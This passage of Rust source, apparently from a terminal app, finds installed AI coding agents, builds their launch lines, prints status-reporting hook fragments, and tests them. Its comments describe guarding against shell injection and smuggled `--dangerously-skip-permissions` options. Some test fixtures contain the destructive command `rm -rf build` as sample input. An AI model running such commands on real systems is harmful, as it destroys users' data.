/// quoted, is one word, and `''` is a word with nothing in it.
///
/// Quotes only. A backslash stays what it is, since in a Windows path it is
/// the separator and not an escape; no agent's name has one to escape.
fn words(command: &str) -> Vec<String> {
    let mut words = Vec::new();
    let mut word: Option<String> = None;
    let mut open = None;
    for character in command.chars() {
        match (open, character) {
            (None, character) if character.is_whitespace() => words.extend(word.take()),
            (None, '\'' | '"') => {
                open = Some(character);
                word.get_or_insert_default();
            }
            (Some(quote), character) if character == quote => open = None,
            (_, character) => word.get_or_insert_default().push(character),
        }
    }
    words.extend(word);
    words
}

/// The line that resumes `program`'s conversation in the directory it is
/// run in, in the `resume` form, or `None` when the agent has none.
///
/// Built in; a person's own lines are the settings' — see
/// [`Settings::resume_line`](crate::settings::Settings::resume_line), which
/// is what a restored pane actually asks.
pub fn resume_line(program: &str, resume: Resume) -> Option<&'static str> {
    let agent = AGENTS.iter().find(|agent| agent.name == program)?;
    match resume {
        Resume::Last => agent.last,
        Resume::Pick => agent.pick,
    }
}

/// The known names, listed the way an error lists them: "claude, codex, ...
/// or aider".
pub fn names_listed() -> String {
    let names: Vec<_> = AGENTS.iter().map(|agent| agent.name).collect();
    let (last, rest) = names.split_last().expect("there is at least one agent");
    format!("{} or {last}", rest.join(", "))
}

/// What the agent the command line calls `name` calls itself — `Claude Code`
/// for `claude` — or `None` for a name the table does not know.
pub fn program(name: &str) -> Option<&'static str> {
    AGENTS
        .iter()
        .find(|agent| agent.name == name)
        .map(|agent| agent.program)
}

/// The known agents installed in one of `directories`, in the table's order.
///
/// A look for each program's file and nothing more: no `which`, no
/// `--version`, nothing started. An agent is a program a person runs, and
/// asking one about itself — even for its help — can be the thing that
/// installs it, logs it in or phones home. What is found is an executable
/// file under the agent's own name; on Windows, one with an extension
/// `PATHEXT` names, which is how that shell finds a program too.
///
/// It reads the disk, so it belongs on the background pool with the other
/// reads the worktree menu makes when it opens — never on the frame.
///
/// Looked for by name first: an agent a pane's shell finds by its name is
/// typed by its name, as it always was, and one found only in an
/// installer's directory is typed by its path.
pub fn found_on(search: &SearchPath) -> Vec<Installed> {
    AGENTS
        .iter()
        .filter_map(|agent| {
            let name = agent.name;
            if search
                .by_name
                .iter()
                .any(|directory| runnable(directory, name))
            {
                return Some(Installed {
                    agent: name,
                    path: None,
                });
            }
            let directory = search
                .installers
                .iter()
                .find(|directory| runnable(directory, name))?;
            // Typed as it is, so only a path every shell reads as one word;
            // any other is left to the installer's own line in a startup
            // file, which is what puts its directory on a shell's `PATH`.
            let path = directory
                .join(name)
                .to_str()
                .filter(|path| plain(path))
                .map(str::to_owned);
            Some(Installed { agent: name, path })
        })
        .collect()
}

/// Where a window looks for the agents it offers to start, in two halves
/// that differ in how the line that starts one names it. See
/// [`search_path`].
#[derive(Clone, Debug, Default, PartialEq, Eq)]
pub struct SearchPath {
    /// Directories a pane's shell finds a program in by its name: the
    /// window's own `PATH`, and the few every login shell has.
    pub by_name: Vec<PathBuf>,
    /// Directories an agent's own installer puts it in, which only that
    /// installer's line in a startup file puts on a shell's `PATH` — and not
    /// always all of them: nvm puts its default node there and no other, and
    /// mise its shims only when asked to. See [`installer_directories`].
    pub installers: Vec<PathBuf>,
}

/// An agent [`found_on`] found installed, and how the line that starts it
/// names its program.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Installed {
    /// The agent, by its name in the table: `opencode`.
    pub agent: &'static str,
    /// The program's path, where the agent was found only in one of
    /// [`SearchPath::installers`]; `None` for one a pane's shell finds by
    /// its name, and for a path a shell would not read as one word.
    pub path: Option<String>,
}

impl Installed {
    /// The line that starts this agent on `prompt`: [`launch_line`], with
    /// the program named by its path where it was found only by one.
    ///
    /// Its path rather than its name, because the pane's shell may not have
    /// the directory it was found in. Nothing else changes: the line is still
    /// read as this agent's — [`program_of`] reads a program by its file
    /// name — and the prompt is quoted as it always was. So is what the
    /// session file keeps: [`launch_of`] keeps no path, and the line a
    /// restart offers to resume this agent names it alone, which the same
    /// shell may not find.
    pub fn launch_line(&self, prompt: &str) -> Option<String> {
        let line = launch_line(self.agent, prompt)?;
        Some(match (&self.path, line.strip_prefix(self.agent)) {
            (Some(path), Some(rest)) => format!("{path}{rest}"),
            _ => line,
        })
    }
}

/// Where a running window looks for the agents: `PATH`, then the
/// directories every login shell has, then the ones the agents' own
/// installers put them in.
///
/// The second is for macOS, where an application started from the
/// Dock or the Finder has launchd's `PATH` — `/usr/bin:/bin:/usr/sbin:/sbin`
/// — and every agent is somewhere else: Homebrew's prefix, `/usr/local/bin`,
/// or `~/.local/bin`, which is where Claude Code's own installer puts it. The
/// pane's login shell has those on its `PATH`, which is the one the line
/// runs under; the window's own does not. Elsewhere they are usually on
/// `PATH` already, and a directory that is not there is simply not looked in.
///
/// The third is for the same window, on Linux as well as macOS: a desktop
/// session's `PATH` is read from the files a login reads, and an installer
/// that puts its directory on `PATH` in `.bashrc` or `.zshrc` is not in it.
/// See [`installer_directories`]. Not the login shell's own `PATH`, read
/// by starting one: that runs the person's startup files, which can start
/// tmux, `exec` another shell or wait on a prompt, and a look that runs
/// nothing cannot hang on any of them.
pub fn search_path() -> SearchPath {
    let mut by_name: Vec<PathBuf> = std::env::var_os("PATH")
        .map(|path| std::env::split_paths(&path).collect())
        .unwrap_or_default();
    let mut installers = Vec::new();
    if cfg!(unix) {
        if let Some(home) = dirs::home_dir() {
            by_name.push(home.join(".local").join("bin"));
            installers = installer_directories(&home);
        }
        by_name.push(PathBuf::from("/opt/homebrew/bin"));
        by_name.push(PathBuf::from("/usr/local/bin"));
    }
    SearchPath {
        by_name,
        installers,
    }
}

/// The directories under `home` that agents' own installers put them in:
/// OpenCode's, Bun's, Volta's, npm's global prefix as npm's own docs set it
/// up for an account with no root, Cargo's, mise's shims, and the `bin` of
/// every Node nvm has installed, the newest first.
///
/// The newest first because it is the likeliest to be nvm's default, which
/// is the one the pane's shell has; an agent installed under an older one
/// is found there all the same, and typed by its path. Reads nvm's
/// directory, so it is called on the pool with the rest of the look.
pub fn installer_directories(home: &Path) -> Vec<PathBuf> {
    let under_home = |directory: &str| {
        directory
            .split('/')
            .fold(home.to_path_buf(), |path, part| path.join(part))
    };
    let mut directories: Vec<PathBuf> = [
        ".opencode/bin",
        ".bun/bin",
        ".volta/bin",
        ".npm-global/bin",
        ".cargo/bin",
        ".local/share/mise/shims",
    ]
    .into_iter()
    .map(under_home)
    .collect();

    let mut nodes: Vec<(Vec<u64>, PathBuf)> = std::fs::read_dir(under_home(".nvm/versions/node"))
        .into_iter()
        .flatten()
        .filter_map(Result::ok)
        .map(|node| (node_version(&node.file_name()), node.path().join("bin")))
        .collect();
    nodes.sort_by(|one, other| other.0.cmp(&one.0));
    directories.extend(nodes.into_iter().map(|(_, bin)| bin));
    directories
}

/// The numbers of the version nvm names a Node's directory by: `v22.3.0`
/// is 22, 3 and 0, so that v22 sorts after v9 as it does not by its
/// letters. A name that is no version has none, and is looked in last.
fn node_version(name: &std::ffi::OsStr) -> Vec<u64> {
    name.to_str()
        .and_then(|name| name.strip_prefix('v'))
        .map(|version| {
            version
                .split('.')
                .map_while(|number| number.parse().ok())
                .collect()
        })
        .unwrap_or_default()
}

/// Whether `directory` holds `name` as a program a shell would run.
#[cfg(unix)]
fn runnable(directory: &Path, name: &str) -> bool {
    use std::os::unix::fs::PermissionsExt;

    std::fs::metadata(directory.join(name))
        .is_ok_and(|found| found.is_file() && found.permissions().mode() & 0o111 != 0)
}

/// See the other one. There is no execute bit here: a program is a file
/// whose extension `PATHEXT` lists, and npm's are `.cmd` files.
#[cfg(not(unix))]
fn runnable(directory: &Path, name: &str) -> bool {
    let extensions = std::env::var("PATHEXT")
        .ok()
        .filter(|extensions| !extensions.is_empty())
        .unwrap_or_else(|| String::from(".COM;.EXE;.BAT;.CMD"));
    extensions
        .split(';')
        .filter(|extension| !extension.is_empty())
        .any(|extension| directory.join(format!("{name}{extension}")).is_file())
}

/// The command line that starts `agent` on `prompt`, or `None` for an agent
/// the table does not know.
///
/// The prompt is one word of it, quoted by the host — the same quoting a
/// plugin's typed argument gets, see [`crate::plugins::wasm::fill`] — and
/// never spliced in as it was typed: a prompt is text somebody may have
/// pasted out of an issue, and `$(…)`, a backtick or a quote in it has to
/// arrive at the agent as characters rather than run in the shell. It is put
/// on one line first, since a newline is what ends a command line, and loses
/// any dashes it begins with, which the agent would otherwise read as an
/// option of its own: `--dangerously-skip-permissions` is a prompt somebody
/// can paste.
///
/// No prompt is the agent on its own, which starts it waiting for one.
pub fn launch_line(agent: &str, prompt: &str) -> Option<String> {
    let known = AGENTS.iter().find(|known| known.name == agent)?;
    let prompt = one_line(prompt, usize::MAX).unwrap_or_default();
    let prompt = prompt.trim_start_matches(['-', ' ']);
    if prompt.is_empty() {
        return Some(known.name.to_owned());
    }
    let template = match known.prompt_flag {
        Some(flag) => format!("{} {flag} {{}}", known.name),
        None => format!("{} {{}}", known.name),
    };
    crate::plugins::wasm::fill(&template, prompt)
}

/// The hooks that make `agent` report itself, as a fragment of its settings.
///
/// Every command hook is [`hook_command`], which finds the binary from the
/// pane it runs in. `binary` is named only in what is not a hook — the
/// OpenCode plugin's string literal and the commands in aider's sentence —
/// and by its full path there, because a plugin or a command runs in
/// whatever `PATH` the agent was started with and a development build is on
/// nobody's. The fragment is printed rather than installed: Crook does not
/// write a file it does not own, and it has never opened any of these. Where
/// Crook ships a plugin that carries the same hooks, [`Hooks::lead`] names
/// the commands that install it, which is the agent writing its own
/// settings.
pub fn hooks_text(agent: &str, binary: &Path) -> Result<Hooks> {
    let Some(known) = AGENTS.iter().find(|known| known.name == agent) else {
        let known: Vec<_> = AGENTS
            .iter()
            .map(|known| {
                if known.name == known.program {
                    known.name.to_owned()
                } else {
                    format!("{} ({})", known.name, known.program)
                }
            })
            .collect();
        bail!(
            "`--agent-hooks` takes one of {}, not {agent}",
            known.join(", ")
        );
    };
    let (text, note) = match known.fragment {
        Fragment::Hooks {
            file,
            events,
            missing,
            trust,
            without,
        } => {
            let hooks = hooks_object(events);
            let text = serde_json::to_string_pretty(&json!({ "hooks": hooks }))
                .context("could not write the hooks as JSON")?;
            let note = format!(
                "# Merge the `hooks` above into {file}. {} then tells the tab it runs in what it \
is doing.{missing}{trust}{without}",
                known.program
            );
            (text, Some(note))
        }
        Fragment::Copilot { file, events } => {
            let hooks: serde_json::Map<String, Value> = events
                .iter()
                .map(|(event, arguments)| {
                    let hook = json!([{ "type": "command", "bash": hook_command(arguments) }]);
                    ((*event).to_owned(), hook)
                })
                .collect();
            let text = serde_json::to_string_pretty(&json!({ "version": 1, "hooks": hooks }))
                .context("could not write the hooks as JSON")?;
            let note = format!(
                "# Save the text above as {file}. {} then tells the tab it runs in what it is \
doing — on macOS and Linux, where the `bash` hook runs; a `powershell` hook for \
Windows is yours to add beside each.",
                known.program
            );
            (text, Some(note))
        }
        Fragment::Plugin { file, source } => {
            let literal = serde_json::to_string(&binary.to_string_lossy())
                .context("could not write the binary's path as a string")?;
            let note = format!(
                "# Save the text above as {file}. {} then tells the tab it runs in what it is \
doing.",
                known.program
            );
            // Without the file's own final newline: `println!` adds one,
            // and the note should not come after a blank line.
            (source.trim_end().replace("BINARY", &literal), Some(note))
        }
        Fragment::None(sentence) => (sentence.replace("BINARY", &quoted(binary)), None),
    };
    // Comment lines and the commands and nothing else, so a person who pastes
    // the whole of it into a shell runs exactly the two. What an agent asks
    // before it runs hooks it asks of its plugin's as well, so that is said
    // here too, for the person who stops reading at the commands.
    let lead = (!known.plugin.is_empty()).then(|| {
        let (by_hand, trust) = match known.fragment {
            Fragment::Hooks { trust, .. } => ("merge the `hooks` below", trust),
            Fragment::Copilot { .. } | Fragment::Plugin { .. } => ("save the file below", ""),
            Fragment::None(_) => ("do what the sentence below says", ""),
        };
        format!(
            "# {} can install these hooks, and the skill beside them, as Crook's plugin:\n{}{trust}\n\
# Or {by_hand} by hand instead; with both, every report is made twice.",
            known.program,
            known.plugin.join("\n")
        )
    });
    Ok(Hooks { lead, text, note })
}

/// A `hooks` object in the shape Claude Code, Codex and Gemini CLI read:
/// each event over one matcher group, with no matcher so it fires every
/// time, running the [`hook_command`] for its `--agent` arguments.
///
/// The Claude Code plugin's `hooks/hooks.json` is this object for
/// [`CLAUDE_EVENTS`], and the tests hold the file to it.
fn hooks_object(events: &[(&str, &str)]) -> serde_json::Map<String, Value> {
    events
        .iter()
        .map(|(event, arguments)| {
            let hook =
                json!([{ "hooks": [{ "type": "command", "command": hook_command(arguments) }] }]);
            ((*event).to_owned(), hook)
        })
        .collect()
}

/// What a hook runs to report `arguments`: `crook --agent <arguments>`,
/// written so that a report can never be what stops an agent.
///
/// Nothing at all outside Crook — `TERM_PROGRAM` is Crook in a pane, and
/// under a tmux started in one, which says `tmux`, `CROOK_PANE_ID` is still
/// there — because an agent's hooks go with it into every other terminal.
/// Except inside tmux, where neither says anything: a tmux server started
/// anywhere else — another terminal, a login, a service that restores
/// sessions — hands its panes neither variable, whichever terminal its
/// client is attached from. Only tmux can name the terminals its clients
/// are on, so the hook runs inside any tmux, and `crook --agent` asks tmux
/// for them and writes the report to each without knowing which is Crook's:
/// any other terminal drops it unread, as everywhere else. The binary is the
/// one the pane names in `CROOK_BIN`, else a `crook` on `PATH` — for a pane
/// that names none, or whose binary has since moved — else there is none and
/// the hook does nothing. Never a path written into the agent's settings:
/// those outlive the binary, and a moved Crook.app or a deleted build would
/// make every hook a "not found". And exit 0 whatever the report did. A
/// report from an agent with no terminal has nowhere to go — `copilot -p`
/// under CI or cron, `ssh` without `-t` — and GitHub Copilot CLI denies the
/// tool call a `preToolUse` hook failed over, so an exit that passed the
/// failure on refused every tool such an agent tried. What went wrong is
/// still said on stderr, which each agent keeps in its log.
///
/// The guard and the lookup are also where these hooks stop short of
/// `crook --agent` itself. The escape sequence crosses `ssh` and
/// `docker exec`, but neither carries `TERM_PROGRAM` or `CROOK_PANE_ID`, nor
/// the `CROOK_BIN` a pane sets, which names a path on the pane's machine
/// anyway. So an agent on the far side of either, with these hooks in its
/// settings there, reports nothing until two things hold there.
/// `TERM_PROGRAM` is passed on: `SendEnv TERM_PROGRAM` in the ssh client's
/// configuration with `AcceptEnv TERM_PROGRAM` in the server's, or
/// `docker exec -e TERM_PROGRAM`. And a `crook` is on that side's `PATH`, or
/// `CROOK_BIN` is set there to one, as in
/// `docker exec -e TERM_PROGRAM -e CROOK_BIN=/opt/crook/crook` for a binary
/// mounted off `PATH`, since the path `--agent-hooks` was run from is not in
/// the hook.
///
/// Spelled from the names the code gives the three variables, so renaming
/// one without the plugin's file is its test failing rather than hooks
/// gating on a variable no pane has. Written for a POSIX shell, which is
/// what these agents run a hook's command in on macOS and Linux — Copilot
/// CLI the one under its `bash` key; an agent on Windows that runs hooks
/// under `cmd.exe` or PowerShell reads none of it.
fn hook_command(arguments: &str) -> String {
    use crate::shell_integration::{BIN_VARIABLE, PANE_ID_VARIABLE, TERM_PROGRAM};
    format!(
        "[ \"$TERM_PROGRAM\" = {TERM_PROGRAM} ] || [ -n \"${PANE_ID_VARIABLE}\" ] || [ -n \"$TMUX\" ] || exit 0; \
crook=${BIN_VARIABLE}; [ -x \"$crook\" ] || crook=$(command -v crook) || exit 0; \
\"$crook\" --agent {arguments} || exit 0"
    )
}

/// `path`, quoted for a POSIX shell.
///
/// Single quotes, which quote everything but themselves, and a quote inside
/// the path closed, escaped and reopened — the one spelling every POSIX
/// shell reads the same way.
fn quoted(path: &Path) -> String {
    format!("'{}'", path.to_string_lossy().replace('\'', "'\\''"))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn the_title_is_the_first_line_of_the_prompt_cut_to_a_row() {
        assert_eq!(
            Some("fix the login bug".to_owned()),
            title_from_hook(r#"{"prompt": "\n  fix the login bug\nand then the tests"}"#)
        );
        let long = "x".repeat(TITLE_CHARS + 5);
        let title = title_from_hook(&format!(r#"{{"prompt": "{long}"}}"#)).unwrap();
        assert_eq!(TITLE_CHARS + 1, title.chars().count());
        assert!(title.ends_with('…'));
    }

    #[test]
    fn a_tab_or_an_escape_in_a_title_is_a_space_rather_than_no_title() {
        // A prompt with pasted code in it holds tabs; a title with one was
        // dropped whole by the wire's rule against control characters, and
        // the tab row stayed at whatever it said before.
        assert_eq!(
            Some("fix the login bug".to_owned()),
            presentable("fix\tthe   login  bug  ")
        );
        // An escape sequence in a title is text once its control bytes are
        // spaces: nothing in it can end the wire's sequence early.
        assert_eq!(
            Some("fix ]0;x bug".to_owned()),
            presentable("fix\u{1b}]0;x\u{7}bug")
        );
        assert_eq!(
            Some("fix the login bug".to_owned()),
            title_from_hook("{\"prompt\": \"fix\\tthe login bug\\nand then\"}")
        );
        assert_eq!(None, presentable("\t \u{1b} \u{7}"));
    }

    #[test]
    fn the_message_is_the_hooks_message_or_else_the_whole_input() {
        assert_eq!(
            Some("Claude needs your permission to use Bash".to_owned()),
            message_from_hook(
                r#"{"hook_event_name": "Notification", "message": "Claude needs your permission to use Bash", "notification_type": "permission_prompt"}"#
            )
        );
        // A script with no JSON to hand pipes the line itself.
        assert_eq!(
            Some("approve the deploy?".to_owned()),
            message_from_hook("approve the deploy?\n")
        );
        // A permission request names the tool and no text — Codex's does —
        // and the row says which tool rather than nothing.
        assert_eq!(
            Some("permission to use Bash".to_owned()),
            message_from_hook(
                r#"{"hook_event_name": "PermissionRequest", "tool_name": "Bash", "tool_input": {"command": "rm -rf build"}}"#
            )
        );
        // JSON that is neither says nothing, rather than `{`.
        assert_eq!(None, message_from_hook(r#"{"prompt": "fix it"}"#));
        assert_eq!(None, message_from_hook(r#"{"message": 3}"#));
        assert_eq!(None, message_from_hook("  \n"));
    }

    #[test]
    fn a_turn_an_api_error_ended_is_said_in_the_words_claude_code_showed() {
        // Claude Code 2.1's StopFailure input: the error's kind, which its
        // matcher runs on, and the sentence it printed in the transcript.
        assert_eq!(
            Some("You've hit your limit · resets 5pm (Europe/Berlin)".to_owned()),
            message_from_hook(
                r#"{"hook_event_name": "StopFailure", "error": "rate_limit", "error_details": "429", "last_assistant_message": "You've hit your limit · resets 5pm (Europe/Berlin)"}"#
            )
        );
        // With no sentence, which Claude Code leaves out when the error's
        // message had no text, the kind is what there is.
        assert_eq!(
            Some("overloaded".to_owned()),
            message_from_hook(r#"{"hook_event_name": "StopFailure", "error": "overloaded"}"#)
        );
        assert_eq!(
            Some("overloaded".to_owned()),
            message_from_hook(
                r#"{"hook_event_name": "StopFailure", "error": "overloaded", "last_assistant_message": " "}"#
            )
        );
        // A notification's own text still comes first.
        assert_eq!(
            Some("Claude is waiting for your input".to_owned()),
            message_from_hook(
                r#"{"message": "Claude is waiting for your input", "error": "unknown"}"#
            )
        );
        // And Codex's PermissionRequest still names the tool.
        assert_eq!(
            Some("permission to use Bash".to_owned()),
            message_from_hook(
                r#"{"hook_event_name": "PermissionRequest", "tool_name": "Bash", "tool_input": {"command": "rm -rf build"}}"#
            )
        );
    }

    #[test]
    fn a_hook_input_with_an_agent_id_is_a_subagents() {
        // Claude Code 2.1's StopFailure for a Task subagent: `agent_id` and
        // `agent_type` beside the error.
        assert!(said_for_a_subagent(
            r#"{"hook_event_name": "StopFailure", "agent_id": "a1b2c3", "agent_type": "general-purpose", "error": "overloaded", "last_assistant_message": "API Error: 529 Overloaded"}"#
        ));
        // The main thread's has no `agent_id`, and a session started with
        // `--agent` has the type without the id: both are the pane's.
        assert!(!said_for_a_subagent(
            r#"{"hook_event_name": "StopFailure", "error": "rate_limit", "last_assistant_message": "You've hit your limit"}"#
        ));
        assert!(!said_for_a_subagent(
            r#"{"hook_event_name": "StopFailure", "agent_type": "reviewer", "error": "overloaded"}"#
        ));
        assert!(!said_for_a_subagent(r#"{"agent_id": " "}"#));
        assert!(!said_for_a_subagent(r#"{"agent_id": null}"#));
        // A script's line is nobody's subagent.
        assert!(!said_for_a_subagent("the tests need a database"));
    }

    #[test]
    fn a_message_is_one_line_and_never_a_novel() {
        let long = "y".repeat(MESSAGE_CHARS + 40);
        let message = presentable_message(&long).unwrap();
        assert_eq!(MESSAGE_CHARS + 1, message.chars().count());
        assert!(message.ends_with('…'));
        // Longer than a title — a question is longer than a name — so a
        // question a title's width would cut short travels whole.
        let question = "z".repeat(TITLE_CHARS + 40);
        assert!(presentable(&question).unwrap().ends_with('…'));
        assert_eq!(Some(question.clone()), presentable_message(&question));
        assert_eq!(
            Some("run rm -rf build? y/n".to_owned()),
            presentable_message("run rm -rf build?\n\ty/n\n")
        );
    }

    #[test]
    fn the_longest_title_and_message_sent_arrive_uncut() {
        // The reading side caps both, since anything in a pane can write the
        // sequence at any length; what this side cuts to a row has to be
        // under those caps, at four bytes a character, or a title cut once
        // here is cut again there.
        let title = presentable(&"🦀".repeat(TITLE_CHARS * 2)).unwrap();
        let message = presentable_message(&"🦀".repeat(MESSAGE_CHARS * 2)).unwrap();
        let mut emulator = crook_terminal::Emulator::new(
            crook_terminal::TerminalSize::new(80, 24),
            0,
            crook_terminal::Palette::default(),
        );
        emulator.advance(
            sequence(
                AgentReport::NeedsInput,
                Some(&title),
                Some(&message),
                None,
                None,
            )
            .as_bytes(),
        );
        assert_eq!(
            vec![crook_terminal::TerminalEvent::Agent(
                crook_terminal::Reported {
                    status: AgentReport::NeedsInput,
                    title: Some(title),
                    message: Some(message),
                }
            )],
            emulator.take_events()
        );
    }

    #[test]
    fn a_hook_input_with_no_prompt_names_nothing() {
        assert_eq!(None, title_from_hook("not json"));
        assert_eq!(None, title_from_hook(r#"{"tool_name": "Bash"}"#));
        assert_eq!(None, title_from_hook(r#"{"prompt": "   \n  "}"#));
    }

    #[test]
    fn the_hooks_call_the_panes_binary_behind_the_guard_and_cover_every_moment() {
        let printed = hooks_text("claude", Path::new("/Applications/Crook's.app/crook")).unwrap();
        let parsed: Value = serde_json::from_str(&printed.text).expect("the fragment is JSON");
        let hooks = parsed["hooks"].as_object().unwrap();
        for event in [
            "UserPromptSubmit",
            "PreToolUse",
            "PostToolUse",
            "PostToolUseFailure",
            "Notification",
            "Stop",
            "StopFailure",
            "SessionEnd",
        ] {
            let command = hooks[event][0]["hooks"][0]["command"].as_str().unwrap();
            assert!(
                command.starts_with(
                    "[ \"$TERM_PROGRAM\" = Crook ] || [ -n \"$CROOK_PANE_ID\" ] || [ -n \"$TMUX\" ] || exit 0; \
crook=$CROOK_BIN; [ -x \"$crook\" ] || crook=$(command -v crook) || exit 0; \"$crook\" --agent "
                ),
                "{event} runs {command}"
            );
            assert!(command.ends_with(" || exit 0"), "{event} runs {command}");
            // The path it was printed from is one a moved or deleted binary
            // leaves behind in the agent's settings.
            assert!(!command.contains("/Applications"), "{event} runs {command}");
        }
        // The notification's text is what the agent is waiting for, and it
        // comes in on stdin: the hook pipes it through rather than needing
        // a `jq` on the machine to pick it out. So is the error a turn ended
        // on, which runs no Stop: failed, since the work stopped short.
        for (event, reports) in [
            ("Notification", "needs-input --message - || exit 0"),
            ("StopFailure", "failed --message - || exit 0"),
        ] {
            let command = hooks[event][0]["hooks"][0]["command"].as_str().unwrap();
            assert!(command.ends_with(reports), "{event} runs {command}");
        }
        // Not PermissionRequest, which Claude Code runs where no dialog is
        // drawn — `claude -p`, a background agent — as well as where one is.
        assert!(hooks.get("PermissionRequest").is_none(), "{hooks:?}");
        assert!(
            hooks["UserPromptSubmit"][0]["hooks"][0]["command"]
                .as_str()
                .unwrap()
                .ends_with("running --title - || exit 0")
        );
        assert!(
            printed.note.unwrap().contains("~/.claude/settings.json"),
            "a person merging the fragment has to be told where it goes"
        );
    }

    #[test]
    fn every_known_agent_prints_its_own_fragment() {
        let binary = Path::new("/opt/crook/bin/crook");
        // Codex reads Claude Code's object with one event of its own.
        let codex = hooks_text("codex", binary).unwrap();
        let parsed: Value = serde_json::from_str(&codex.text).expect("the fragment is JSON");
        let command = parsed["hooks"]["PermissionRequest"][0]["hooks"][0]["command"]
            .as_str()
            .unwrap();
        assert_eq!(hook_command("needs-input --message -"), command);
        assert!(parsed["hooks"].get("Notification").is_none());
        assert!(codex.note.unwrap().contains("~/.codex/hooks.json"));

        // Gemini CLI's names for the same moments.
        let gemini = hooks_text("gemini", binary).unwrap();
        let parsed: Value = serde_json::from_str(&gemini.text).unwrap();
        for event in [
            "BeforeAgent",
            "BeforeTool",
            "AfterTool",
            "Notification",
            "AfterAgent",
        ] {
            assert!(
                parsed["hooks"].get(event).is_some(),
                "gemini has no {event}"
            );
        }
        assert!(gemini.note.unwrap().contains("~/.gemini/settings.json"));

        // Copilot's file has a version and `bash` where the others have
        // `command`.
        let copilot = hooks_text("copilot", binary).unwrap();
        let parsed: Value = serde_json::from_str(&copilot.text).unwrap();
        assert_eq!(1, parsed["version"]);
        assert_eq!(
            hook_command("idle --session -"),
            parsed["hooks"]["agentStop"][0]["bash"].as_str().unwrap()
        );
        assert_eq!(
            hook_command("running --title - --session-start -"),
            parsed["hooks"]["sessionStart"][0]["bash"].as_str().unwrap()
        );
        assert!(
            copilot
                .note
                .unwrap()
                .contains("~/.copilot/hooks/crook.json")
        );

        // OpenCode's is a plugin, with the binary as a string literal.
        let opencode = hooks_text("opencode", binary).unwrap();
        assert!(opencode.text.starts_with("// Crook:"));
        assert!(
            opencode
                .text
                .contains("const crook = \"/opt/crook/bin/crook\"\n")
        );
        assert!(opencode.text.contains("export const CrookPlugin"));
        // A prompt that opens with `-` is not handed to `--title`, which
        // would read stdin for it.
        assert!(opencode.text.contains(r#"title === "-""#));
        for event in [
            "session.created",
            "session.status",
            "permission.asked",
            "question.asked",
            "session.idle",
        ] {
            assert!(
                opencode.text.contains(&format!("\"{event}\"")),
                "the plugin misses {event}"
            );
        }
        // A subagent's session is made with its parent's id, and is known by
        // it, or asked about when it was made before: its prompt names no tab
        // and its idle ends no turn. What the plugin does with that is the
        // Node test's to prove.
        assert!(opencode.text.contains("Boolean(properties.info.parentID)"));
        assert!(
            opencode
                .text
                .contains("client.session.get({ path: { id } })")
        );
        assert!(
            opencode
                .text
                .contains("await report(properties.sessionID, \"idle\")")
        );
        assert!(opencode.text.contains("!part.synthetic"));
        assert!(
            opencode
                .note
                .unwrap()
                .contains("~/.config/opencode/plugins/crook.ts")
        );
    }

    #[test]
    fn the_codex_lead_note_and_skill_say_codex_runs_the_hooks_only_once_trusted() {
        // Codex holds hooks merged into its file back behind a review on its
        // next start, whose third choice is "Continue without trusting (hooks
        // won't run)", and keeps a hash of each hook it was told to trust, so
        // a hook whose command changes is held back again. The hooks its
        // plugin carries are held back the same way: codex-cli 0.149.1 opened
        // on "6 hooks are new or changed" after `codex plugin add`. Either
        // way the tab says nothing, and these are the places a person, or the
        // agent setting Codex up for them, can learn why: the lead for the
        // plugin, the note for the hooks merged by hand.
        let printed = hooks_text("codex", Path::new("/opt/crook/bin/crook")).unwrap();
        let lead = printed.lead.unwrap();
        let note = printed.note.unwrap();
        for said in [&lead, &note] {
            let trust = said
                .lines()
                .find(|line| line.contains("trust"))
                .unwrap_or_else(|| panic!("this never mentions trusting the hooks: {said}"));
            assert!(trust.starts_with("# "), "{said}");
            assert!(trust.contains("/hooks"), "{said}");
            assert!(trust.contains("asks again"), "{said}");
        }

        // The skill's sentence comes right after the commands that install
        // the plugin, and says it of every hook, merged or installed.
        let paragraphs: Vec<&str> = SKILL.split("\n\n").collect();
        let commands = paragraphs
            .iter()
            .position(|paragraph| paragraph.contains("\ncodex plugin add crook@crook\n"))
            .expect("the skill gives the commands that install Codex's plugin");
        let skill = paragraphs[commands..]
            .iter()
            .find(|paragraph| !paragraph.starts_with("```"))
            .unwrap();
        assert!(skill.starts_with("Codex runs"), "{skill}");
        assert!(skill.contains("trust"), "{skill}");
        assert!(skill.contains("/hooks"), "{skill}");
        assert!(skill.contains("asks again"), "{skill}");
    }

    #[test]
    fn the_skill_says_which_codex_and_gemini_questions_come_as_needs_input() {
        // The skill is what tells an orchestrating agent which state to wait
        // for, and a state it promised that never comes is a wait that runs
        // out, and is run again, on a worker sitting at a question. A question
        // either agent's model asks in its reply ends its turn, and neither has
        // an event for that: each table says needs-input for one event, the
        // ones Crook's plugin gives Codex included, since those are pinned to
        // the same table.
        fn hooks(name: &str) -> (&'static [(&'static str, &'static str)], &'static str) {
            let agent = AGENTS.iter().find(|agent| agent.name == name).unwrap();
            let Fragment::Hooks {
                events, missing, ..
            } = agent.fragment
            else {
                panic!("{name} has command hooks");
            };
            (events, missing)
        }
        for (name, asking) in [("codex", "PermissionRequest"), ("gemini", "Notification")] {
            let (events, missing) = hooks(name);
            let needs_input: Vec<&str> = events
                .iter()
                .filter(|(_, arguments)| arguments.starts_with("needs-input"))
                .map(|(event, _)| *event)
                .collect();
            assert_eq!(vec![asking], needs_input, "{name}");
            assert!(
                missing.contains("a question the model asks in its reply ends its turn as idle"),
                "{name}: {missing}"
            );
        }

        // Gemini CLI 0.61.0 runs that `Notification` whenever a tool waits for
        // confirmation, and its `ask_user` dialog always does. This is the
        // input its hook was handed for one, from a session against a
        // stand-in model, cut to the fields that say what it was: the row
        // says the message, and the question is only under `details`.
        let ask_user = r#"{"hook_event_name": "Notification", "notification_type": "ToolPermission", "message": "Tool requires confirmation", "details": {"type": "ask_user", "title": "Ask User", "questions": [{"question": "Which module first?", "header": "Module", "type": "choice"}]}}"#;
        let message = message_from_hook(ask_user).unwrap();
        assert_eq!("Tool requires confirmation", message);
        let gemini = hooks("gemini").1;
        assert!(
            gemini.contains("its ask_user questions included, which the row says as needs-input"),
            "{gemini}"
        );

        // codex-cli 0.149.1 asks in a dialog only in Plan mode, through its
        // `request_user_input` tool, and runs `PreToolUse` for that and nothing
        // more until the person answers: no `Stop`, since the turn is still
        // open, and no `PermissionRequest`, since it is no approval. That the
        // row keeps that running against the title's "Action Required" is
